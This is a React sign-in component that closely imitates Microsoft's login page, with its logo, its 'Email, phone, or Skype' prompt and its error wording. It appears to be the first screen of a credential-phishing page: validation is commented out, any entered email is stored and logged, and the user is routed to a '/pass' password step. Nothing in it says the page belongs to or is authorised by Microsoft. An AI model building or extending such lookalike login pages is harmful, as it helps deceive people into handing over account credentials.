import React, { useState } from "react";
import { motion } from "framer-motion";
import logo from "../assets/Microsoft_Logo_1.png";
import Footer from "./footer"
import { useNavigate } from "react-router";
import { GrKey } from "react-icons/gr";

export default function SignIn() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [isEmailValid, setIsEmailValid] = useState(false);
  const navigate = useNavigate();

  const validEmailCheck = (email) => {
    const emailRegex = /^\S+@\S+\.\S+$/;
    if (!email) {
      setError("Enter a valid email address, phone number, or Skype name.");
      return false;
    } else if (!emailRegex.test(email)) {
      setError("That email address format isn’t valid.");
      return false;
    }
    setError("");
    return true;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // const isValid = validEmailCheck(email);
    // if (!isValid) return;

    localStorage.setItem("userEmail", email);
    console.log("Email submitted:", email);
    navigate("/pass");
  };

  return (
    <div className="bg-image">
      <div className="flex flex-col mx-auto items-center justify-center h-[95vh]">
      <motion.div
        initial={{ x: 100, opacity: 0 }}
        animate={{ x: 0, opacity: 1 }}
        transition={{ duration: 0.8, ease: "easeInOut" }}
        className="flex flex-col items-center"
      >
        <div className="card w-screen lg:w-[480px] bg-white px-5 lg:px-12 py-10">
          <img className="w-20 lg:w-30 pb-1" src={logo} alt="logo" />
          <h1 className="text-[25px] font-semibold">Sign in</h1>

          <form onSubmit={handleSubmit}>
            {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
            <input
              className="py-2 my-3 border-b w-full outline-0"
              type="email"
              placeholder="Email, phone, or Skype"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />

            <p className="text-[13px] text-[#1080db] hover:underline cursor-pointer">
              No account? Create one!
            </p>
            <p className="text-[13px] pt-1 text-[#1080db] hover:underline cursor-pointer">
              Can’t access your account?
            </p>

            <div className="flex justify-end mt-4">
              <button
                type="submit"
                className="bg-[#1080db] text-white border-2 border-[#69b5f3] hover:bg-[#0c66b0] w-[100px] py-1"
              >
                Next
              </button>
            </div>
          </form>
        </div>
        <div className="card w-xs md:w-2xl lg:w-[480px] bg-white px-5 lg:px-12 py-4 border mt-8">
          <p className="flex items-center gap-2"><span><GrKey /></span>Sign-in Options</p>
        </div>
      </motion.div>
    </div>
      <Footer />
    </div>
  );
}
